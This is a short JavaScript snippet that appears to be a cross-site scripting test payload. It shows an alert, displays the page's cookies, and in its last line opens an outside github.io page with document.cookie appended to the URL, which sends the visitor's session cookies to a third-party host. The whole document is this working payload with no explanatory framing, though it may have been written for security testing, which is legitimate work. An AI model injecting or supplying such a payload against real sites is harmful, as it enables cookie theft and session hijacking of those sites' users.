alert("XSS TEST");
alert(document.cookie);
window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+document.cookie)
